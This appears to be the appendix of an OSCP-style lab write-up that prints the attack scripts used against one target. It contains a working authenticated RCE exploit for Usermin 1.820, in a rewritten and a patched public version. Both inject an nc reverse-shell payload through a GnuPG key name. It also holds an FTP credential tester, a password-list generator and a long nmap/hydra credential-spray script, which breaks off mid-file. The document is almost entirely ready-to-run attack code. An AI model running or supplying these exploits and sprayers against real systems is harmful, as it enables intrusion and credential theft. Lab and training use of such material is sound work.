# Appendix — every script, in full

These are the scripts that were actually run, copied verbatim from
[`scripts/`](https://github.com/AV10V/OSCP/tree/main/labs/192.168.161.157-charlie/scripts) in the
repository. Nothing is elided and nothing is paraphrased — if a line looks odd, that is the line that
ran.

| # | Script | Runs on | Purpose |
|---|---|---|---|
| 8.1 | `exploit_usermin_1820_7f3a.py` | Kali | Usermin 1.820 GnuPG RCE, rewritten |
| 8.2 | `edb-50234-patched.py` | Kali | Published EDB 50234, two-line fix |
| 8.3 | `charlie_ftp_credtest_7f3a.py` | Kali | Nine-attempt FTP credential test |
| 8.4 | `gencreds_charlie_7f3a.sh` | Kali | Names → username/password lists |
| 8.5 | `enum_spray_2.sh` | Kali | Range enumeration + service spray |
| 8.6 | `privesc_tar_wildcard_7f3a.sh` | target (cassie) | Plant the tar checkpoint payload |
| 8.7 | `unblock_sshd_7f3a.sh` | target (root) | Remove `DenyUsers`, validate, restart ssh |

---

## 8.1 `exploit_usermin_1820_7f3a.py`

The exploit that produced the foothold. Rewrite of EDB 50234: verifies the key really exists before using it, prints the gpg error instead of crashing, and falls back to importing a key whose UID carries the payload. `--payload` takes any command; `--idx` forces a key index.

*227 lines, 9100 bytes.*

```python
#!/usr/bin/env python3
# Usermin <= 1.820 - Authenticated RCE via GnuPG key name (gnupg module)
#
# Fixed version of EDB 50234. The original crashes with
#   IndexError: list index out of range
# when the key it tries to create is never actually created (gpg >= 2.3 rejects
# Usermin's "Key-Type: default" + "Key-Usage: sign,encrypt,auth" batch stanza).
# The original never checks for that, and its "successfully" check matches text
# that appears even on the failure page.
#
# This version:
#   * verifies the key really exists in the keyring before using it
#   * prints the gpg error Usermin returned instead of crashing
#   * falls back to importing a key whose UID carries the payload
#     (same unsanitized name used in gnupg-lib.pl key_fingerprint())
#   * no [-2] index gymnastics, no invalid escape sequences
#
# Usage:
#   python3 exploit_usermin_1820_7f3a.py -u 192.168.161.157 -l cassie -p cassie \
#           --lhost 192.168.45.158 --lport 1337
#   ... --mode import     force the import path
#   ... --idx 0           force a specific key index
#   ... --debug           save HTTP bodies to ./usermin_debug/

import argparse
import os
import re
import shutil
import subprocess
import sys
import tempfile

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

DEBUG_DIR = "usermin_debug"


def dbg_save(name, content):
    os.makedirs(DEBUG_DIR, exist_ok=True)
    path = os.path.join(DEBUG_DIR, name)
    mode = "wb" if isinstance(content, bytes) else "w"
    with open(path, mode) as fh:
        fh.write(content)
    print("    [debug] saved {}".format(path))


def login(session, target, user, password):
    headers = {"Cookie": "redirect=1; testing=1;", "Referer": target}
    r = session.post(target + "/session_login.cgi", headers=headers,
                     verify=False,
                     data={"user": user, "pass": password}, timeout=20)
    return "webmin_search.cgi" in r.text or "session_login.cgi" not in r.url


def key_indices(session, target, debug=False):
    """Return the sorted list of key indexes present on the list page."""
    r = session.get(target + "/gnupg/list_keys.cgi", verify=False,
                    headers={"Referer": target + "/gnupg/"}, timeout=20)
    if debug:
        dbg_save("list_keys.html", r.text)
    hits = re.findall(r"edit_key\.cgi\?idx=(\d+)", r.text)
    return sorted({int(i) for i in hits})


def extract_error(page):
    """Pull Usermin's 'Failed to create secret key : <pre>gpg: ...</pre>' text."""
    m = re.search(r"Failed to create secret key[^<]*:?\s*<pre>(.*?)</pre>", page,
                  re.S | re.I)
    if not m:
        return None
    text = re.sub(r"<[^>]+>", "", m.group(1))
    return "\n".join(line.strip() for line in text.splitlines() if line.strip())


def create_key(session, target, name, email, debug=False):
    """Original vector: Usermin writes our name into a gpg batch file."""
    r = session.post(target + "/gnupg/secret.cgi", verify=False,
                     headers={"Referer": target + "/gnupg/"},
                     data={"name": name, "email": email}, timeout=120)
    if debug:
        dbg_save("secret.html", r.text)
    err = extract_error(r.text)
    if err:
        print("[-] Usermin could not create the key:")
        for line in err.splitlines():
            print("      {}".format(line))
        return False
    return True


def build_key(uid):
    """Generate a throwaway key locally whose UID is the payload, return armor."""
    if not shutil.which("gpg"):
        print("[-] gpg not found locally - import mode needs it")
        return None
    home = tempfile.mkdtemp(prefix="usermin_key_")
    env = dict(os.environ, GNUPGHOME=home)
    try:
        subprocess.run(
            ["gpg", "--batch", "--passphrase", "", "--quick-generate-key",
             uid, "rsa2048", "sign", "never"],
            env=env, check=True, capture_output=True, timeout=180)
        armor = subprocess.run(["gpg", "--armor", "--export", uid],
                               env=env, check=True, capture_output=True,
                               timeout=60).stdout
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as exc:
        print("[-] local key generation failed: {}".format(exc))
        return None
    finally:
        shutil.rmtree(home, ignore_errors=True)
    return armor.decode() if armor else None


def import_key(session, target, armor, debug=False):
    """Import path: no gpg key generation happens on the target at all."""
    r = session.post(target + "/gnupg/import.cgi", verify=False,
                     headers={"Referer": target + "/gnupg/"},
                     files={"mode": (None, "2"), "text": (None, armor)},
                     timeout=60)
    if debug:
        dbg_save("import.html", r.text)
    return "import.cgi" not in r.url


def trigger(session, target, idx, timeout=6):
    """Open the key for editing - this is where the name reaches the shell."""
    url = "{}/gnupg/edit_key.cgi?idx={}".format(target, idx)
    print("[*] Triggering {}".format(url))
    try:
        session.get(url, verify=False,
                    headers={"Referer": target + "/gnupg/list_keys.cgi"},
                    timeout=timeout)
        print("[+] Request returned - command ran in the pipeline")
    except (requests.exceptions.Timeout,
            requests.packages.urllib3.exceptions.ReadTimeoutError):
        print("[+] Request held open (command still running in the pipeline)")
    except requests.exceptions.ConnectionError as exc:
        print("[+] Connection dropped while the command ran ({})".format(
            type(exc).__name__))
    except requests.exceptions.RequestException as exc:
        print("[!] Trigger request: {}".format(exc))


def main():
    ap = argparse.ArgumentParser(
        description="Usermin <= 1.820 authenticated RCE via GnuPG key name")
    ap.add_argument("-u", "--host", required=True)
    ap.add_argument("-l", "--login", required=True)
    ap.add_argument("-p", "--password", required=True)
    ap.add_argument("--lhost", required=True)
    ap.add_argument("--lport", type=int, required=True)
    ap.add_argument("--mode", choices=["auto", "create", "import"],
                    default="auto")
    ap.add_argument("--idx", type=int, help="force a key index")
    ap.add_argument("--payload", help="command to run (default: reverse shell)")
    ap.add_argument("--email", default="1337@webmin.com")
    ap.add_argument("--debug", action="store_true")
    args = ap.parse_args()

    target = "https://{}:20000".format(args.host)
    payload = args.payload or (
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f;"
        .format(args.lhost, args.lport))
    inject = '";{}echo "'.format(payload)

    print("[+] Target {}".format(target))
    session = requests.Session()
    if not login(session, target, args.login, args.password):
        print("[-] AUTH: login failed")
        return 1
    print("[+] Login successfully")

    before = key_indices(session, target, args.debug)
    print("[*] Keys before: {}".format(before or "none"))

    idx = args.idx
    if idx is None:
        created = False
        if args.mode in ("auto", "create"):
            print("[*] Creating key through secret.cgi")
            created = create_key(session, target, inject, args.email, args.debug)
            if created:
                print("[+] Key creation returned no error")

        after = key_indices(session, target, args.debug)
        new = [i for i in after if i not in before]
        if created and new:
            idx = new[-1]
            print("[+] New key index {}".format(idx))
        elif args.mode == "create":
            print("[-] No new key appeared - creation vector unusable")
            return 1
        else:
            if args.mode == "auto":
                if created:
                    print("[-] Usermin reported no error but no key exists")
                print("[*] Falling back to import vector")
            armor = build_key(inject)
            if not armor:
                return 1
            if not import_key(session, target, armor, args.debug):
                print("[-] Import failed")
                return 1
            after = key_indices(session, target, args.debug)
            new = [i for i in after if i not in before]
            if new:
                idx = new[-1]
                print("[+] Imported key index {}".format(idx))
            elif after:
                # the same UID was imported on an earlier run - reuse that key
                idx = after[-1]
                print("[!] No new key (payload UID already imported); "
                      "reusing index {}".format(idx))
            else:
                print("[-] Imported key is not listed - nothing to trigger")
                return 1

    trigger(session, target, idx)
    print("[+] Done - check your listener on {}:{}".format(args.lhost, args.lport))
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

## 8.2 `edb-50234-patched.py`

The published EDB 50234 with two edits ([PATCH A] and [PATCH B]) and nothing else changed. Same injection, no `[-2]` index, no false `successfully` check.

*101 lines, 4252 bytes.*

```python
# Exploit Title: Usermin 1.820 - Remote Code Execution (RCE) (Authenticated)
# Rework Date: 31.10.2024
# Author: Numan Turle Reworker: Tunahan TEKEOĞLU
# Vendor Homepage: https://www.webmin.com/usermin.html
# Software Link: https://github.com/webmin/usermin
# Version: <=1820
#
# --- PATCHED ---------------------------------------------------------------
# Two edits only, marked [PATCH A] and [PATCH B] below. The published script
# dies with `IndexError: list index out of range` at the `[-2]` index, because
# it assumes the keyring renders at least two edit_key.cgi links. It also
# trusts the word "successfully", which is page boilerplate and appears even
# when gpg refused to create the key. Everything else is unchanged.
# ---------------------------------------------------------------------------

#!/usr/bin/python3
# -*- coding: utf-8 -*-

import argparse, requests, warnings, json, re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from cmd import Cmd

warnings.simplefilter('ignore', InsecureRequestWarning)

def init():
    parser = argparse.ArgumentParser(description='Usermin - Remote Code Execution (Authenticated) ( Version 1.820 )')
    parser.add_argument('-u', '--host', help='Host', type=str, required=True)
    parser.add_argument('-l', '--login', help='Username', type=str, required=True)
    parser.add_argument('-p', '--password', help='Password', type=str, required=True)
    parser.add_argument('--lhost', help='Local IP for reverse shell', type=str, required=True)
    parser.add_argument('--lport', help='Local port for reverse shell', type=int, required=True)
    args = parser.parse_args()
    exploit(args)

def exploit(args):
    session = requests.Session()
    target = "https://{}:20000".format(args.host)
    username = args.login
    password = args.password
    listen_ip = args.lhost
    listen_port = args.lport

    print("[+] Target {}".format(target))

    headers = {
        'Cookie': 'redirect=1; testing=1;',
        'Referer': target
    }

    login = session.post(target + "/session_login.cgi", headers=headers, verify=False, data={"user": username, "pass": password})
    login_content = str(login.content)
    search = "webmin_search.cgi"
    check_login_string = re.findall(search, login_content)

    if check_login_string:
        print("[+] Login successfully")
        print("[+] Setup GnuPG")

        payload = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f;".format(listen_ip, listen_port)
        post_data = {
            "name": '";{}echo "'.format(payload),
            "email": "1337@webmin.com",
        }

        print("[+] Payload {}".format(post_data))

        session.headers.update({'referer': target})

        create_secret = session.post(target + "/gnupg/secret.cgi", verify=False, data=post_data)
        create_secret_content = str(create_secret.content)

        # [PATCH A] "successfully" is boilerplate -- it is on the page whether or not
        # gpg created anything. Probe the keyring and keep the indexes we found.
        probe = session.post(target + "/gnupg/list_keys.cgi", verify=False)
        check_exp = re.findall(r"edit_key\.cgi\?idx=(\d+)", str(probe.content))

        if check_exp:
            print("[+] Setup successful")
            print("[+] Fetching key list")

            session.headers.update({'referer': target})
            key_list = session.post(target + "/gnupg/list_keys.cgi", verify=False)
            # [PATCH B] no [-2]: take the last index that actually exists, and
            # rebuild the query string the way edit_key.cgi expects it.
            last_gets_key = "idx={}".format(re.findall(r"edit_key\.cgi\?idx=(\d+)", str(key_list.content))[-1])
            print("[+] Key : {}".format(last_gets_key))

            session.headers.update({'referer': target})
            try:
                key_list = session.post(target + "/gnupg/edit_key.cgi?{}".format(last_gets_key), verify=False, timeout=3)
            except requests.exceptions.ReadTimeout:
                pass

            print("[+] 5ucc355fully_3xpl017")
        else:
            print("[-] An unexpected error occurred")
    else:
        print("[-] AUTH : Login failed.")

if __name__ == "__main__":
    init()
```

## 8.3 `charlie_ftp_credtest_7f3a.py`

Nine attempts, deterministic: three harvested first names against their case-flipped variants. On success it prints the FTP home directory and dumps any flag file it finds.

*129 lines, 3644 bytes.*

```python
#!/usr/bin/env python3
"""charlie_ftp_credtest_7f3a.py

Try FTP logins derived from the three PDF author names (cassie, mark, robert)
using the case-variant passwords, then pull local.txt / proof.txt from the
home directory of whichever account works.

Usage:
    python3 charlie_ftp_credtest_7f3a.py -H 192.168.161.157
    python3 charlie_ftp_credtest_7f3a.py -H 192.168.161.157 -p 21 --list-only

Nothing is brute-forced: 3 users x 3 passwords = 9 attempts, by design.
"""

import argparse
import ftplib
import io
import socket
import sys

NAMES = ["cassie", "mark", "robert"]
INTERESTING = ("local.txt", "proof.txt", "flag.txt", "flag")


def case_variants(name):
    """lowercase, Capitalized, UPPERCASE -- the documented derivation."""
    return [name, name[:1].upper() + name[1:], name.upper()]


def candidates(names):
    for u in names:
        for p in case_variants(u):
            yield u, p


def login(host, port, user, pw, timeout):
    ftp = ftplib.FTP()
    ftp.connect(host, port, timeout=timeout)
    ftp.login(user, pw)
    return ftp


def list_dir(ftp, path):
    try:
        entries = ftp.nlst(path)
    except ftplib.error_perm:
        return [], []
    files, dirs = [], []
    for e in entries:
        base = e.rsplit("/", 1)[-1]
        if base in (".", ".."):
            continue
        # distinguish dirs by trying to change into them
        try:
            ftp.cwd(e)
            ftp.cwd(path if path else "/")
            dirs.append(e)
        except ftplib.error_perm:
            files.append(e)
    return files, dirs


def try_download(ftp, path):
    buf = io.BytesIO()
    try:
        ftp.retrbinary("RETR " + path, buf.write)
        return buf.getvalue().decode("utf-8", "replace")
    except ftplib.error_perm:
        return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-H", "--host", required=True)
    ap.add_argument("-p", "--port", type=int, default=21)
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--list-only", action="store_true",
                    help="stop after finding working credentials")
    args = ap.parse_args()

    hit = None
    for user, pw in candidates(NAMES):
        try:
            ftp = login(args.host, args.port, user, pw, args.timeout)
        except ftplib.error_perm as exc:
            code = str(exc)[:3]
            print("[ ] {:8s} {:8s} -> {}".format(user, pw, code))
            continue
        except (socket.timeout, OSError) as exc:
            print("[!] {}:{} unreachable: {}".format(args.host, args.port, exc))
            return 2
        print("[+] VALID  {}:{}".format(user, pw))
        hit = (user, pw, ftp)
        break

    if not hit:
        print("\n[-] None of the 9 combinations worked.")
        return 1

    user, pw, ftp = hit
    print("[*] pwd = {}".format(ftp.pwd()))
    files, dirs = list_dir(ftp, ftp.pwd())
    print("[*] files: {}".format(files or "-"))
    print("[*] dirs : {}".format(dirs or "-"))

    if args.list_only:
        ftp.quit()
        return 0

    found = False
    for name in files:
        if name.rsplit("/", 1)[-1].lower() in INTERESTING:
            body = try_download(ftp, name)
            if body is not None:
                found = True
                print("\n===== {} =====".format(name))
                print(body.strip()[:2000])

    if not found:
        print("\n[-] No flag file in the FTP home dir; try: ssh {}@{}".format(user, args.host))
    else:
        print("\n[*] Reuse the same pair on SSH: ssh {}@{}".format(user, args.host))

    ftp.quit()
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

## 8.4 `gencreds_charlie_7f3a.sh`

Turns harvested names into username and password lists. Wider net than the nine-attempt test, including lowercase, capitalised and upper-case forms plus common suffixes.

*74 lines, 2464 bytes.*

```bash
#!/usr/bin/env bash
# gencreds_charlie_7f3a.sh
# Build targeted username/password lists from names harvested from FTP metadata.
# Usage: ./gencreds_charlie_7f3a.sh names.txt [users.txt] [pw.txt]
# names.txt: one name per line, e.g. "Cassie Smith" or "Robert Mark" or "cassie"
set -euo pipefail

names_file="${1:-names.txt}"
out_users="${2:-users.txt}"
out_pw="${3:-pw.txt}"

if [ ! -s "$names_file" ]; then
  echo "ERROR: '$names_file' missing or empty. Put one author name per line." >&2
  exit 1
fi

tmp_users=$(mktemp)
tmp_pw=$(mktemp)
# shellcheck disable=SC2064
trap "rm -f '$tmp_users' '$tmp_pw'" EXIT

while IFS= read -r raw; do
  # trim, collapse whitespace, strip CR
  name=$(printf '%s' "$raw" | tr -d '\r' | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' -e 's/[[:space:]][[:space:]]*/ /g')
  [ -n "$name" ] || continue

  lower=$(printf '%s' "$name" | tr '[:upper:]' '[:lower:]')

  set -- $lower
  first="$1"
  shift || true
  last="${1:-}"

  # --- usernames -----------------------------------------------------------
  printf '%s\n' "$first" >> "$tmp_users"
  if [ -n "$last" ]; then
    printf '%s\n' "${first}${last}" >> "$tmp_users"
    printf '%s\n' "${first}.${last}" >> "$tmp_users"
    printf '%s\n' "${first}_${last}" >> "$tmp_users"
    printf '%s\n' "${first:0:1}${last}" >> "$tmp_users"
  fi

  # --- passwords -----------------------------------------------------------
  # every username token and every name part, in three casings, plus suffixes
  {
    printf '%s\n' "$lower"
    printf '%s\n' "$first"
    if [ -n "$last" ]; then printf '%s\n' "$last"; printf '%s\n' "${first}${last}"; fi
  } | while IFS= read -r tok; do
    tok=$(printf '%s' "$tok" | tr -d ' ')
    [ -n "$tok" ] || continue
    cap=$(printf '%s' "$tok" | sed 's/^\(.\)/\U\1/')
    up=$(printf '%s' "$tok" | tr '[:lower:]' '[:upper:]')
    for v in "$tok" "$cap" "$up"; do
      printf '%s\n' "$v" >> "$tmp_pw"
      for suf in 1 12 123 '123!' '!' 2022 2023; do
        printf '%s%s\n' "$v" "$suf" >> "$tmp_pw"
      done
      printf '!%s\n' "$v" >> "$tmp_pw"
    done
  done
done < "$names_file"

sort -u "$tmp_users" > "$out_users"
sort -u "$tmp_pw" > "$out_pw"

# usernames are also plausible passwords
{ cat "$out_users"; cat "$out_pw"; } | sort -u > "${out_pw}.tmp" && mv "${out_pw}.tmp" "$out_pw"

echo "usernames: $(wc -l < "$out_users")  -> $out_users"
echo "passwords: $(wc -l < "$out_pw")  -> $out_pw"
echo
echo "--- usernames ---"
cat "$out_users"
```

## 8.5 `enum_spray_2.sh`

Standalone service enumeration and credential sprayer for a list of hosts: reads `ips.txt`, `users.txt` and `pass.txt` from the current directory and reports which service accepts which pair. Used for the first pass over the range.

*524 lines, 18770 bytes.*

```bash
#!/usr/bin/env bash
#==============================================================================
#  enum_spray_2.sh  -  single-file enumeration + credential spray
#
#  Drop this script on the Desktop next to ips.txt / users.txt / pass.txt and:
#
#      ./enum_spray_2.sh
#
#  It reads the input files from its OWN directory (no -d needed), scans the
#  hosts, sprays every password against every user, and writes a report.
#
#  Requires : nmap, hydra
#  Optional : netexec / nxc  (only used if --sprayer nxc or auto finds it)
#
#  Every service ends with a clear verdict:
#     HIT          - at least one login worked (printed + saved)
#     CLEAN        - the sprayer really ran every round, nothing worked
#     INCONCLUSIVE - the sprayer did not run / errored; NOT proof of bad creds
#
#  Usage:
#     ./enum_spray_2.sh                  # inputs from script dir
#     ./enum_spray_2.sh --dry-run        # show the plan only
#     ./enum_spray_2.sh --no-scan        # reuse nmap xml from last run
#     ./enum_spray_2.sh --services ftp   # restrict protocols
#==============================================================================
set -uo pipefail

VERSION="2.0"

SELF_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" 2>/dev/null && pwd) || SELF_DIR=$PWD
PROG=$(basename -- "${BASH_SOURCE[0]:-$0}")
TAB=$(printf '\t')

#-------------------------------- output helpers ------------------------------
C_R=$'\033[0m'; C_RED=$'\033[31m'; C_GRN=$'\033[32m'
C_YEL=$'\033[33m'; C_CYN=$'\033[36m'; C_BLD=$'\033[1m'
msg()  { printf '%s[*]%s %s\n' "$C_CYN" "$C_R" "$*"; }
sub()  { printf '      %s\n' "$*"; }
ok()   { printf '%s[+]%s %s\n' "$C_GRN" "$C_R" "$*"; }
warn() { printf '%s[!]%s %s\n' "$C_YEL" "$C_R" "$*" >&2; }
bad()  { printf '%s[-]%s %s\n' "$C_RED" "$C_R" "$*" >&2; }
hr()   { printf '  %s\n' "--------------------------------------------------------------------"; }
die()  { bad "$*"; exit 1; }

#-------------------------------- defaults ------------------------------------
INPUT_DIR=""
IPS_FILE=""
USERS_FILE=""
PASS_FILE=""
OUT=""
DO_SCAN=1
DRY=0
FORCE_SPRAYER="auto"      # auto | hydra | nxc
ONLY_SERVICES=""          # override of the sprayable protocol list
THREADS=4
TIMEOUT=10
PORTS="21,22,23,25,110,139,143,389,445,465,587,993,995,1433,3306,3389,5432,5900,5985,5986,20000,8080,8443"

DEFAULT_SERVICES="ftp,ssh,mysql,mssql,postgres,smtp,telnet,vnc,ldap,smb,winrm"

NMAP=""
HYDRA=""
NXC=""

usage() {
  cat <<EOF
$PROG v$VERSION - enumerate and spray credentials

  ./$PROG                       inputs from the script's own directory
  ./$PROG -d DIR                inputs from DIR instead
  ./$PROG --dry-run             print the plan, send nothing
  ./$PROG --no-scan             reuse nmap XML from the output dir
  ./$PROG --services ftp,ssh    only spray these protocols
  ./$PROG --sprayer hydra|nxc   force a sprayer
  ./$PROG --ports 21,22,20000   override the scanned port list
  ./$PROG -o DIR                output directory

Inputs (all optional, but you need at least ips.txt):
  ips.txt    one IP / hostname / CIDR per line
  users.txt  one username per line
  pass.txt   one password per line
EOF
}

#-------------------------------- arg parsing --------------------------------
while [[ $# -gt 0 ]]; do
  case "$1" in
    -d|--dir)        INPUT_DIR="${2:-}"; shift 2;;
    --ips)           IPS_FILE="${2:-}";   shift 2;;
    --users)         USERS_FILE="${2:-}"; shift 2;;
    --pass|--passwords) PASS_FILE="${2:-}"; shift 2;;
    -o|--out)        OUT="${2:-}";        shift 2;;
    --ports)         PORTS="${2:-}";      shift 2;;
    --services)      ONLY_SERVICES="${2:-}"; shift 2;;
    --sprayer)       FORCE_SPRAYER="${2:-}"; shift 2;;
    --threads)       THREADS="${2:-4}";   shift 2;;
    --timeout)       TIMEOUT="${2:-10}";  shift 2;;
    --no-scan)       DO_SCAN=0;   shift;;
    --dry-run)       DRY=1;       shift;;
    -h|--help)       usage; exit 0;;
    --version)       echo "$PROG $VERSION"; exit 0;;
    *)               die "unknown option: $1 (try --help)";;
  esac
done

[[ $THREADS =~ ^[0-9]+$ ]] || die "--threads must be a number"
[[ $TIMEOUT =~ ^[0-9]+$ ]] || die "--timeout must be a number"
case "$FORCE_SPRAYER" in auto|hydra|nxc) ;; *) die "--sprayer must be auto, hydra or nxc";; esac

SERVICES="${ONLY_SERVICES:-$DEFAULT_SERVICES}"

#-------------------------------- preflight ----------------------------------
command -v nmap  >/dev/null 2>&1 && NMAP=$(command -v nmap)
command -v hydra >/dev/null 2>&1 && HYDRA=$(command -v hydra)
for c in nxc netexec crackmapexec; do
  if command -v "$c" >/dev/null 2>&1; then NXC=$(command -v "$c"); break; fi
done

preflight() {
  (( DO_SCAN == 0 )) || [[ -n $NMAP ]] || die "nmap not found and --no-scan not given"
  case "$FORCE_SPRAYER" in
    hydra) [[ -n $HYDRA ]] || die "--sprayer hydra given but hydra not found";;
    nxc)   [[ -n $NXC   ]] || die "--sprayer nxc given but no nxc/netexec/crackmapexec found";;
    auto)  [[ -n $HYDRA || -n $NXC ]] || die "no sprayer found (need hydra or netexec)";;
  esac
  [[ -z $HYDRA ]] || msg "sprayer : hydra ($HYDRA)"
  [[ -z $NXC   ]] || msg "sprayer : $NXC (fallback only, --sprayer nxc to force)"
}

#-------------------------------- input layout -------------------------------
resolve_inputs() {
  # an explicit -d wins; otherwise prefer the script's own directory (Desktop),
  # then the current directory, then ~/Desktop / /root/Desktop
  if [[ -n $INPUT_DIR ]]; then
    [[ -d $INPUT_DIR ]] || die "input directory not found: $INPUT_DIR"
  else
    local cand
    for cand in "$SELF_DIR" "$PWD" "$HOME/Desktop" "/root/Desktop"; do
      [[ -d $cand ]] || continue
      if [[ -f $cand/ips.txt || -f $cand/users.txt || -f $cand/pass.txt ]]; then
        INPUT_DIR=$cand; break
      fi
    done
    INPUT_DIR="${INPUT_DIR:-$SELF_DIR}"
  fi

  IPS_FILE="${IPS_FILE:-$INPUT_DIR/ips.txt}"
  USERS_FILE="${USERS_FILE:-$INPUT_DIR/users.txt}"
  PASS_FILE="${PASS_FILE:-$INPUT_DIR/pass.txt}"

  if [[ -z $OUT ]]; then OUT="$INPUT_DIR/enum_spray_2_$(date +%Y%m%d_%H%M%S)"; fi
  PREV_RUN=""
  if (( DO_SCAN == 0 )); then
    PREV_RUN=$(ls -1d "$INPUT_DIR"/enum_spray_2_* 2>/dev/null | sort | tail -n1)
  fi
}

make_dirs() {
  mkdir -p "$OUT"/{nmap,norm,logs,results} || die "cannot create $OUT"
  if (( DO_SCAN == 0 )) && [[ -n ${PREV_RUN:-} && -d $PREV_RUN/nmap ]]; then
    cp -f "$PREV_RUN"/nmap/*.xml "$OUT/nmap/" 2>/dev/null \
      && msg "--no-scan: reusing XML from $PREV_RUN"
  fi
  SERVICES_TSV="$OUT/results/services.tsv";  : > "$SERVICES_TSV"
  PLAN="$OUT/results/plan.tsv";              : > "$PLAN"
  HITS="$OUT/results/hits.tsv";              : > "$HITS"
  ERRORS="$OUT/results/sprayer_errors.tsv";  : > "$ERRORS"
  VERDICTS="$OUT/results/verdicts.tsv";      : > "$VERDICTS"
  REPORT="$OUT/report.md"
}

normalize() { # src dst [strip-comments]
  local src=$1 dst=$2
  if [[ ! -f $src ]]; then : > "$dst"; return 1; fi
  tr -d '\r' < "$src" \
    | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' \
    | grep -vE '^($|#|;)' | awk '!seen[$0]++' > "$dst"
  [[ -s $dst ]]
}

normalize_inputs() {
  IPS_NORM="$OUT/norm/ips.txt"
  USERS_NORM="$OUT/norm/users.txt"
  PASS_NORM="$OUT/norm/pass.txt"

  if normalize "$IPS_FILE" "$IPS_NORM"; then
    sub "ips.txt   : $(wc -l < "$IPS_NORM") target(s)   [$IPS_FILE]"
  else
    warn "no usable targets in $IPS_FILE"
  fi

  if normalize "$USERS_FILE" "$USERS_NORM"; then
    sub "users.txt : $(wc -l < "$USERS_NORM") username(s) [$USERS_FILE]"
  else
    warn "no usable usernames in $USERS_FILE - spray stage will be skipped"
  fi

  if normalize "$PASS_FILE" "$PASS_NORM"; then
    sub "pass.txt  : $(wc -l < "$PASS_NORM") password(s) [$PASS_FILE]"
  else
    warn "no usable passwords in $PASS_FILE - spray stage will be skipped"
  fi

  (( $(wc -l < "$USERS_NORM") > 0 && $(wc -l < "$PASS_NORM") > 0 )) || DO_SPRAY=0
}
DO_SPRAY=${DO_SPRAY:-1}

#-------------------------------- scan stage ---------------------------------
scan() {
  if (( DO_SCAN == 0 )); then
    msg "scan skipped (--no-scan) - reading $OUT/nmap/*.xml"
    local xml
    for xml in "$OUT"/nmap/*.xml; do
      [[ -f $xml ]] || continue
      parse_xml "$xml" >> "$SERVICES_TSV" || warn "cannot parse $xml"
    done
    sort -u -t"$TAB" -k1,1V -k2,2n "$SERVICES_TSV" -o "$SERVICES_TSV"
    msg "open ports recovered: $(wc -l < "$SERVICES_TSV")"
    (( $(wc -l < "$SERVICES_TSV") > 0 )) || warn "no nmap XML found in $OUT/nmap - run without --no-scan first"
    return 0
  fi

  [[ -n $NMAP ]] || { warn "nmap not available - scan skipped"; return 0; }
  hr
  msg "nmap: -p$PORTS -T4 (targets: $(wc -l < "$IPS_NORM"))"
  if (( DRY == 1 )); then
    sub "[dry-run] nmap -Pn -sV -p$PORTS -T4 --open -oA $OUT/nmap/scan -iL $IPS_NORM"
    return 0
  fi
  "$NMAP" -Pn -sV -p"$PORTS" -T4 --open -oA "$OUT/nmap/scan" \
      -iL "$IPS_NORM" > "$OUT/nmap/scan.stdout" 2>&1
  local rc=$?
  (( rc == 0 )) || warn "nmap exited $rc (see $OUT/nmap/scan.stdout)"

  if [[ -f $OUT/nmap/scan.xml ]]; then
    parse_xml "$OUT/nmap/scan.xml" > "$SERVICES_TSV" || warn "cannot parse nmap XML"
    ok "open ports: $(wc -l < "$SERVICES_TSV")"
  else
    warn "nmap produced no XML"
  fi
}

parse_xml() { # nmap xml -> TSV: host port proto service product version
  python3 - "$1" <<'PY'
import sys, xml.etree.ElementTree as ET
try:
    root = ET.parse(sys.argv[1]).getroot()
except Exception as exc:
    sys.stderr.write("parse error: %s\n" % exc)
    sys.exit(1)
for host in root.findall('host'):
    st = host.find('status')
    if st is not None and st.get('state') != 'up':
        continue
    addr = ''
    for a in host.findall('address'):
        if a.get('addrtype') in ('ipv4', 'ipv6'):
            addr = a.get('addr') or ''
            break
    if not addr:
        continue
    for p in host.findall('ports/port'):
        s = p.find('state')
        if s is None or s.get('state') != 'open':
            continue
        svc = p.find('service')
        name = (svc.get('name') if svc is not None else '') or '-'
        prod = (svc.get('product') if svc is not None else '') or '-'
        ver = (svc.get('version') if svc is not None else '') or '-'
        print('\t'.join([addr, p.get('portid', ''), p.get('protocol', ''),
                         name, prod, ver]))
PY
}

#-------------------------------- plan stage ---------------------------------
svc_to_proto() { # nmap service name, port -> protocol (empty = not sprayable)
  local n=${1,,} p=${2:-0}
  case "$n" in
    ftp|ssh|telnet|smtp|mysql|vnc) echo "$n"; return;;
    postgresql|postgres) echo postgres; return;;
    ms-sql-s|mssql) echo mssql; return;;
    microsoft-ds|netbios-ssn|smb) echo smb; return;;
    ldap|ldaps|globalcatldap*) echo ldap; return;;
    wsman) echo winrm; return;;
  esac
  case "$p" in
    21) echo ftp;;              22) echo ssh;;
    23) echo telnet;;           25|587|465) echo smtp;;
    3306) echo mysql;;          5900|5901) echo vnc;;
    5432) echo postgres;;       1433) echo mssql;;
    445|139) echo smb;;         389|636|3268|3269) echo ldap;;
    5985|5986) echo winrm;;
  esac
}

service_wanted() { [[ ",${SERVICES}," == *",$1,"* ]]; }

build_plan() {
  local addr port proto sname prod ver
  [[ -s $SERVICES_TSV ]] || return 0
  while IFS="$TAB" read -r addr port proto sname prod ver; do
    [[ -z ${addr:-}${port:-} ]] && continue
    local p; p=$(svc_to_proto "${sname:-}" "$port")
    [[ -z $p ]] && continue
    service_wanted "$p" || continue
    printf '%s\t%s\t%s\n' "$addr" "$port" "$p" >> "$PLAN"
  done < "$SERVICES_TSV"
  # one entry per host+protocol (nmap can report the same thing twice)
  awk -F'\t' '!seen[$1 FS $3]++' "$PLAN" | sort -t"$TAB" -k1,1V -k3,3 -k2,2n > "$PLAN.tmp"
  mv "$PLAN.tmp" "$PLAN"
}

